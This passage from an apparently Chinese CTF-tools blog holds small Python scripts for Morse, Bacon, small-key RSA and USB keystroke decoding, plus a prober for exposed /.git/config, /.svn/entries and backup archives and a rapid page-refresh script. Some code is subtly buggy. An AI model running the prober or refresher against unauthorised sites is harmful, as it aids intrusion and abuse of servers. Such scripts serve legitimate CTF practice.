<span class="string">'6'</span>,</span><br><span class="line">        <span class="string">'--...'</span>: <span class="string">'7'</span>,</span><br><span class="line">        <span class="string">'---..'</span>: <span class="string">'8'</span>,</span><br><span class="line">        <span class="string">'----.'</span>: <span class="string">'9'</span>,</span><br><span class="line">        <span class="string">'-----'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'.-.-.-'</span>: <span class="string">'.'</span>,</span><br><span class="line">        <span class="string">'..--..'</span>: <span class="string">'?'</span>,</span><br><span class="line">        <span class="string">'-.-.--'</span>: <span class="string">'!'</span>,</span><br><span class="line">        <span class="string">'-..-.'</span>: <span class="string">'/'</span>,</span><br><span class="line">        <span class="string">'.--.-.'</span>: <span class="string">'@'</span>,</span><br><span class="line">        <span class="string">'---...'</span>: <span class="string">':'</span>,</span><br><span class="line">        <span class="string">'-.--.'</span>: <span class="string">'('</span>,</span><br><span class="line">        <span class="string">'-.--.-'</span>: <span class="string">')'</span>,</span><br><span class="line">        <span class="string">'-....-'</span>: <span class="string">'-'</span>,</span><br><span class="line">        <span class="string">'.-.-.-'</span>: <span class="string">'.'</span>,</span><br><span class="line">        <span class="string">'----.--'</span>: <span class="string">'&#123;'</span>,</span><br><span class="line">        <span class="string">'-----.-'</span>: <span class="string">'&#125;'</span>,</span><br><span class="line">        <span class="string">'-....-'</span>: <span class="string">'='</span>,</span><br><span class="line">        <span class="string">'.----.'</span>: <span class="string">'\''</span>,</span><br><span class="line">        <span class="string">'..--.-'</span>: <span class="string">'_'</span>,</span><br><span class="line">        <span class="string">'...-..-'</span>: <span class="string">'$'</span>,</span><br><span class="line">        <span class="string">'-.-.-.'</span>: <span class="string">';'</span>,</span><br><span class="line">        <span class="string">'.-..-.'</span>: <span class="string">'"'</span>,</span><br><span class="line">        <span class="string">'. ...'</span>: <span class="string">'&amp;'</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">print</span> (dict[item],end=<span class="string">''</span>)</span><br><span class="line"><span class="comment">#print (s)</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="批量替换txt里字符"><a href="#批量替换txt里字符" class="headerlink" title="批量替换txt里字符"></a>批量替换txt里字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">'C:\\Users\\Administrator\\Downloads'</span>) <span class="comment"># 跳到某盘</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'as_code.txt'</span>): <span class="comment"># 看一下这个文件是否存在</span></span><br><span class="line">    exit(<span class="number">-1</span>) <span class="comment">#，不存在就退出</span></span><br><span class="line">lines = open(<span class="string">'as_code.txt'</span>).readlines() <span class="comment">#打开文件，读入每一行</span></span><br><span class="line">fp = open(<span class="string">'as_code1.txt'</span>,<span class="string">'w'</span>) <span class="comment">#打开你要写的文件,不存在则创建</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> lines:</span><br><span class="line">    fp.write( s.replace(<span class="string">'s'</span>,<span class="string">'0'</span>).replace(<span class="string">'a'</span>,<span class="string">'1'</span>)) <span class="comment"># replace是替换，write是写入</span></span><br><span class="line">    fp.close() <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="web源码泄露探测"><a href="#web源码泄露探测" class="headerlink" title="web源码泄露探测"></a>web源码泄露探测</h2><p>用来探测一些常见的源码泄露<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">lists = [<span class="string">'/.git/config'</span>, <span class="string">'/.svn/entries'</span>, <span class="string">'web.rar'</span>, <span class="string">'www.zip'</span>, <span class="string">'www.rar'</span>, <span class="string">'wwwroot.rar'</span>, <span class="string">'1.rar'</span>, <span class="string">'bbs.zip'</span>, <span class="string">'website.rar'</span>]</span><br><span class="line">print(<span class="string">'- - - - - - - - - - - - - - - - - - - -'</span>)</span><br><span class="line">print(<span class="string">u'|    就是个自己用的小脚本 by Damya   |'</span>)</span><br><span class="line">print(<span class="string">'- - - - - - - - - - - - - - - - - - - -'</span>)</span><br><span class="line"><span class="comment"># 用来输入需要探测的网址</span></span><br><span class="line">address = input(<span class="string">'请输入URL地址：'</span>)</span><br><span class="line"><span class="comment"># 把列表里的元素一个一个遍历出来</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> lists:</span><br><span class="line">    <span class="comment"># 把网址和探测的文件连接到一起</span></span><br><span class="line">    tance = <span class="string">"%s/%s"</span> % (address, a)</span><br><span class="line">    <span class="comment"># print tance   </span></span><br><span class="line">    <span class="comment"># 使用 request 模块里的 get 来获取这个网址</span></span><br><span class="line">    qq = requests.get(url=tance)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取响应码并赋值给 dq</span></span><br><span class="line">    dq = qq.status_code</span><br><span class="line">    <span class="comment"># 判断响应码是否为 200 ，是，就进行下一步</span></span><br><span class="line">    <span class="keyword">if</span> dq == <span class="number">200</span> :</span><br><span class="line">        <span class="comment"># 输出 响应码和探测地址</span></span><br><span class="line">        print(<span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance))</span><br><span class="line">    <span class="comment"># 如果响应码不是 200 就进行着一步</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 输入响应码和地址</span></span><br><span class="line">        print(<span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance))</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="模拟自动刷新脚本"><a href="#模拟自动刷新脚本" class="headerlink" title="模拟自动刷新脚本"></a>模拟自动刷新脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refresh</span><span class="params">(url,num)</span>:</span></span><br><span class="line">    driver = webdriver.Chrome(<span class="string">"C:/python27/chromedriver.exe"</span>)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">        driver.refresh()</span><br><span class="line">    print(<span class="string">'Browser will be close after 600s'</span>)</span><br><span class="line">    time.sleep(<span class="number">600</span>)</span><br><span class="line">    driver.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = input(<span class="string">"Please enter the url:\n"</span>)</span><br><span class="line">    num = int(input(<span class="string">"Enter the number of refresh:\n"</span>))</span><br><span class="line">    refresh(url,num)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="培根密码解密脚本"><a href="#培根密码解密脚本" class="headerlink" title="培根密码解密脚本"></a>培根密码解密脚本</h2><p>包含两种解法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>]</span><br><span class="line"></span><br><span class="line">first_cipher = [<span class="string">"aaaaa"</span>,<span class="string">"aaaab"</span>,<span class="string">"aaaba"</span>,<span class="string">"aaabb"</span>,<span class="string">"aabaa"</span>,<span class="string">"aabab"</span>,<span class="string">"aabba"</span>,<span class="string">"aabbb"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaab"</span>,<span class="string">"ababa"</span>,<span class="string">"ababb"</span>,<span class="string">"abbaa"</span>,<span class="string">"abbab"</span>,<span class="string">"abbba"</span>,<span class="string">"abbbb"</span>,<span class="string">"baaaa"</span>,<span class="string">"baaab"</span>,<span class="string">"baaba"</span>,<span class="string">"baabb"</span>,<span class="string">"babaa"</span>,<span class="string">"babab"</span>,<span class="string">"babba"</span>,<span class="string">"babbb"</span>,<span class="string">"bbaaa"</span>,<span class="string">"bbaab"</span>]</span><br><span class="line"></span><br><span class="line">second_cipher = [<span class="string">"aaaaa"</span>,<span class="string">"aaaab"</span>,<span class="string">"aaaba"</span>,<span class="string">"aaabb"</span>,<span class="string">"aabaa"</span>,<span class="string">"aabab"</span>,<span class="string">"aabba"</span>,<span class="string">"aabbb"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaab"</span>,<span class="string">"ababa"</span>,<span class="string">"ababb"</span>,<span class="string">"abbaa"</span>,<span class="string">"abbab"</span>,<span class="string">"abbba"</span>,<span class="string">"abbbb"</span>,<span class="string">"baaaa"</span>,<span class="string">"baaab"</span>,<span class="string">"baaba"</span>,<span class="string">"baabb"</span>,<span class="string">"baabb"</span>,<span class="string">"babaa"</span>,<span class="string">"babab"</span>,<span class="string">"babba"</span>,<span class="string">"babbb"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></span><br><span class="line">    upper_flag = <span class="literal">False</span> <span class="comment"># 用于判断输入是否为大写</span></span><br><span class="line">    string = raw_input(<span class="string">"please input string to encode:\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> string.isupper():</span><br><span class="line">        upper_flag = <span class="literal">True</span></span><br><span class="line">        string = string.lower()</span><br><span class="line">    e_string1 = <span class="string">""</span></span><br><span class="line">    e_string2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> index == alphabet[i]:</span><br><span class="line">                e_string1 += first_cipher[i]</span><br><span class="line">                e_string2 += second_cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> upper_flag:</span><br><span class="line">        e_string1 = e_string1.upper()</span><br><span class="line">        e_string2 = e_string2.upper()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"first encode method result is:\n"</span>+e_string1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"second encode method result is:\n"</span>+e_string2</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    upper_flag = <span class="literal">False</span>  <span class="comment"># 用于判断输入是否为大写</span></span><br><span class="line">    e_string = raw_input(<span class="string">"please input string to decode:\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> e_string.isupper():</span><br><span class="line">        upper_flag = <span class="literal">True</span></span><br><span class="line">        e_string = e_string.lower()</span><br><span class="line">    e_array = re.findall(<span class="string">".&#123;5&#125;"</span>,e_string)</span><br><span class="line">    d_string1 = <span class="string">""</span></span><br><span class="line">    d_string2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> e_array:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> index == first_cipher[i]:</span><br><span class="line">                d_string1 += alphabet[i]</span><br><span class="line">            <span class="keyword">if</span> index == second_cipher[i]:</span><br><span class="line">                d_string2 += alphabet[i]</span><br><span class="line">    <span class="keyword">if</span> upper_flag:</span><br><span class="line">        d_string1 = d_string1.upper()</span><br><span class="line">        d_string2 = d_string2.upper()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"first decode method result is:\n"</span>+d_string1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"second decode method result is:\n"</span>+d_string2</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\t\tcoding by qux"</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\t*******Bacon Encode_Decode System*******"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"input should be only lowercase or uppercase,cipher just include a,b(or A,B)"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"1.encode\n2.decode\n3.exit"</span></span><br><span class="line">        s_number = raw_input(<span class="string">"please input number to choose\n"</span>)</span><br><span class="line">        <span class="keyword">if</span> s_number == <span class="string">"1"</span>:</span><br><span class="line">            encode()</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">elif</span> s_number == <span class="string">"2"</span>:</span><br><span class="line">            decode()</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">elif</span> s_number == <span class="string">"3"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="RSA解密模板脚本"><a href="#RSA解密模板脚本" class="headerlink" title="RSA解密模板脚本"></a>RSA解密模板脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag = open('flag.txt','r').read()</span></span><br><span class="line"><span class="comment"># N = 221</span></span><br><span class="line"><span class="comment"># e = 5</span></span><br><span class="line"><span class="comment"># enc = b''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in flag:</span></span><br><span class="line"><span class="comment">#     enc += bytes([pow(ord(i),e,N)])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt = open('encrypt','wb')</span></span><br><span class="line"><span class="comment"># encrypt.write(enc)</span></span><br><span class="line"><span class="comment"># encrypt.close()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    N=<span class="number">221</span></span><br><span class="line">    e=<span class="number">5</span></span><br><span class="line">    encrypt=open(<span class="string">'encrypt'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">    dic=<span class="string">'''1234567890~`!@#$%^&amp;*()_+-=[]&#123;&#125;;:'"|\\,&lt;.&gt;/?qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP'''</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    length=len(encrypt)</span><br><span class="line">    num=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> encrypt:</span><br><span class="line">        j=<span class="number">0</span>;</span><br><span class="line">        <span class="comment"># zhu=i</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">            <span class="keyword">if</span>((pow(ord(dic[k]),e,N))==i):</span><br><span class="line">                flag+=dic[k]</span><br><span class="line">                j=<span class="number">1</span></span><br><span class="line">        <span class="comment"># if(j==0):</span></span><br><span class="line">        <span class="comment">#   print("第&#123;&#125;次没查出来".format(num))</span></span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">    print(flag)</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="敲击码转换脚本"><a href="#敲击码转换脚本" class="headerlink" title="敲击码转换脚本"></a>敲击码转换脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"\n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>,  <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="string">"""00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:17:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:17:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0b:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0c:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0c:16:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:0c:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:10:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:10:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1c:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:13:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:04:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1a:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:1a:12:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:12:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:15:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:07:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:1e:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:28:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">keys = keys.split(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">"usb.dat"</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>: <span class="string">"a"</span>, <span class="string">"05"</span>: <span class="string">"b"</span>, <span class="string">"06"</span>: <span class="string">"c"</span>, <span class="string">"07"</span>: <span class="string">"d"</span>, <span class="string">"08"</span>: <span class="string">"e"</span>, <span class="string">"09"</span>: <span class="string">"f"</span>, <span class="string">"0a"</span>: <span class="string">"g"</span>, <span class="string">"0b"</span>: <span class="string">"h"</span>, <span class="string">"0c"</span>: <span class="string">"i"</span>,</span><br><span class="line">              <span class="string">"0d"</span>: <span class="string">"j"</span>, <span class="string">"0e"</span>: <span class="string">"k"</span>, <span class="string">"0f"</span>: <span class="string">"l"</span>, <span class="string">"10"</span>: <span class="string">"m"</span>, <span class="string">"11"</span>: <span class="string">"n"</span>, <span class="string">"12"</span>: <span class="string">"o"</span>, <span class="string">"13"</span>: <span class="string">"p"</span>, <span class="string">"14"</span>: <span class="string">"q"</span>, <span class="string">"15"</span>: <span class="string">"r"</span>,</span><br><span class="line">              <span class="string">"16"</span>: <span class="string">"s"</span>, <span class="string">"17"</span>: <span class="string">"t"</span>, <span class="string">"18"</span>: <span class="string">"u"</span>, <span class="string">"19"</span>: <span class="string">"v"</span>, <span class="string">"1a"</span>: <span class="string">"w"</span>, <span class="string">"1b"</span>: <span class="string">"x"</span>, <span class="string">"1c"</span>: <span class="string">"y"</span>, <span class="string">"1d"</span>: <span class="string">"z"</span>, <span class="string">"1e"</span>: <span class="string">"1"</span>,</span><br><span class="line">              <span class="string">"1f"</span>: <span class="string">"2"</span>, <span class="string">"20"</span>: <span class="string">"3"</span>, <span class="string">"21"</span>: <span class="string">"4"</span>, <span class="string">"22"</span>: <span class="string">"5"</span>, <span class="string">"23"</span>: <span class="string">"6"</span>, <span class="string">"24"</span>: <span class="string">"7"</span>, <span class="string">"25"</span>: <span class="string">"8"</span>, <span class="string">"26"</span>: <span 